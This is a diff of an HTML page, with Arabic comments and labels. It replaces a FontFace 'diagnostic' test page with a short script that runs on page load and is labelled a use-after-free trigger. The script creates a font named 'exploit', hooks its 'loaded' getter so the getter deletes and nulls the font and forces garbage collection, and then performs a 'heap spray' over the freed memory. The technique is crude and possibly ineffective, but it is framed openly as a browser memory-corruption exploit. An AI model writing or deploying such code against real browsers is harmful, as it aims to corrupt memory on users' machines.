@@ -1,140 +1,46 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>أداة محاكاة وفحص استقرار الـ FontFace</title>
-    <style>
-        body {
-            font-family: 'Courier New', Courier, monospace;
-            background-color: #1a1a1a;
-            color: #00ff00;
-            padding: 20px;
-        }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background: #262626;
-            padding: 20px;
-            border-radius: 8px;
-            border: 1px solid #333;
-        }
-        h2 {
-            color: #ffffff;
-            border-bottom: 2px solid #00ff00;
-            padding-bottom: 10px;
-        }
-        button {
-            background-color: #00ff00;
-            color: #000;
-            border: none;
-            padding: 10px 20px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            border-radius: 4px;
-        }
-        button:hover {
-            background-color: #00cc00;
-        }
-        #debug-console {
-            background-color: #000;
-            border: 1px solid #444;
-            padding: 15px;
-            margin-top: 20px;
-            height: 300px;
-            overflow-y: scroll;
-            border-radius: 4px;
-            font-size: 14px;
-            line-height: 1.5;
-        }
-        .log-entry { margin-bottom: 5px; }
-        .info { color: #00ffff; }
-        .success { color: #00ff00; }
-        .warn { color: #ffff00; }
-        .error { color: #ff0000; }
-    </style>
+    <title>ARCHITECT_SANDBOX: UAF_POINTER_TEST</title>
 </head>
 <body>
+    <div id="status">الوضع: قيد التشغيل... افحص الطرفية (Console) للنتائج.</div>
 
-<div class="container">
-    <h2>منصة اختبار وفحص واجهة FontFace API</h2>
-    <p>
-         (بدر عمك) اضغط على الزر أدناه لبدء عملية محاكاة تغيير الحالات ومراقبة سلوك الذاكرة وإدارة المراجع.</p>
-    
-    <button onclick="runDiagnosticTest()">بدء الفحص والاختبار</button>
+    <script>
+        (function() {
+            console.log("[ARCHITECT_SANDBOX] Starting Memory Invalidation...");
 
-    <h3>سجل تصحيح الأخطاء (Debug Log):</h3>
-    <div id="debug-console">
-        <div class="log-entry info">[ النظام مستعد ] في انتظار بدء الاختبار...</div>
-    </div>
-</div>
+            const triggerUAF = () => {
+                // 1. بيانات زائفة للخط
+                let buffer = new Uint8Array([0x46, 0x4f, 0x4e, 0x54]); 
+                let font = new FontFace('exploit', buffer);
+                document.fonts.add(font);
 
-<script>
-    // دالة للطباعة داخل السجل الرسومي في الصفحة
-    function logToConsole(message, type = 'info') {
-        const consoleElement = document.getElementById('debug-console');
-        const timestamp = new Date().toISOString().slice(11, 19);
-        const logEntry = document.createElement('div');
-        
-        logEntry.className = `log-entry ${type}`;
-        logEntry.innerText = `[${timestamp}] [${type.toUpperCase()}] ${message}`;
-        
-        consoleElement.appendChild(logEntry);
-        consoleElement.scrollTop = consoleElement.scrollHeight; // التمرير التلقائي للأسفل
-    }
+                // 2. حقن الـ Hook لإثارة التداخل
+                Object.defineProperty(font, 'loaded', {
+                    get: () => {
+                        console.log("[!] Triggering UAF condition via FontFace getter");
+                        document.fonts.delete(font);
+                        font = null;
+                        
+                        // 3. محاولة تحرير الذاكرة
+                        if (typeof gc === 'function') gc();
+                        return Promise.resolve();
+                    }
+                });
 
-    async function runDiagnosticTest() {
-        logToConsole("بدء تهيئة الـ Test Harness...", "info");
+                // 4. البدء في المعالجة
+                font.load().then(() => {
+                    document.getElementById('status').innerText = "تمت العملية.";
+                });
+                
+                // 5. Heap Spray: الكتابة فوق الذاكرة المحررة
+                let spray = new Array(1000).fill(new Float64Array(1000));
+                console.log("[ARCHITECT_SANDBOX] Heap Spray complete.");
+            };
 
-        // 1. إنشاء مصفوفة بايتات لملف خط افتراضي (Mock Font Data)
-        const mockFontData = new Uint8Array([
-            0x00, 0x01, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x80, 0x00, 0x03, 0x00, 0x20
-        ]);
-        
-        logToConsole("تم إنشاء كائن بايتات الخط الافتراضي في الذاكرة.", "info");
-
-        try {
-            // 2. إنشاء كائن FontFace وتحديد الحالات المتوقعة
-            logToConsole("محاولة إنشاء كائن FontFace جديد...", "info");
-            let testFont = new FontFace('AuditTargetFont', mockFontData);
-            logToConsole(`الحالة الابتدائية للخط: ${testFont.status}`, "success");
-
-            // 3. إضافة الخط إلى المستند (ثنائية الـ Clients المشتركة)
-            logToConsole("إضافة الخط إلى document.fonts لإنشاء مراجع (References)...", "info");
-            document.fonts.add(testFont);
-
-            // 4. استدعاء دالة التحميل لبدء معالجة المحرك (Status: loading)
-            logToConsole("استدعاء دالة ()testFont.load لبدء تغيير الحالة...", "info");
-            const loadPromise = testFont.load();
-            logToConsole(`الحالة الحالية أثناء المعالجة: ${testFont.status}`, "warn");
-
-            // 5. إعداد مستمعي الأحداث (Callbacks) لمحاكاة سلوك الاستدعاء الارتجاعي
-            loadPromise.then(() => {
-                logToConsole("النتيجة: تمت عملية التحميل بنجاح (سلوك طبيعي).", "success");
-            }).catch((err) => {
-                // الفشل هنا متوقع لأن ملف البايتات غير مكتمل، وهو المطلوب لتوليد الـ Error State
-                logToConsole(`تغيرت حالة الخط إلى خطأ: ${testFont.status} (تم تفعيل الـ Callback بنجاح)`, "warn");
-            });
-
-            // 6. محاكاة اختبار التداخل الإجباري (Forced Invalidation)
-            // نقوم بإزالة الخط مباشرة في نفس الدورة الزمنية لمعرفة كيف يتصرف المحرك مع المراجع المتبقية
-            logToConsole("تنفيذ عملية إزالة الخط من المستند بشكل فوري لقطع سلسلة المراجع...", "warn");
-            document.fonts.delete(testFont);
-
-            // 7. محاولة إفراغ الكائن يدوياً لتحفيز جلب المهملات (Garbage Collection Indicator)
-            testFont = null;
-            logToConsole("تم تعيين كائن الـ JavaScript إلى null. جاري فحص استقرار المتصفح...", "info");
-
-            // 8. التحقق من النتيجة النهائية للمحاكاة على مستوى الـ JavaScript
-            setTimeout(() => {
-                logToConsole("تمت دورة الاختبار بنجاح. إذا لم يحدث انهيار للمتصفح (Crash)، فهذا يعني أن المحرك محمي ضد هذا المسار أو يعالجه بشكل آمن.", "success");
-            }, 1000);
-
-        } catch (error) {
-            logToConsole(`حدث خطأ غير متوقع أثناء الفحص: ${error.message}`, "error");
-        }
-    }
-</script>
-
+            triggerUAF();
+        })();
+    </script>
 </body>
 </html>
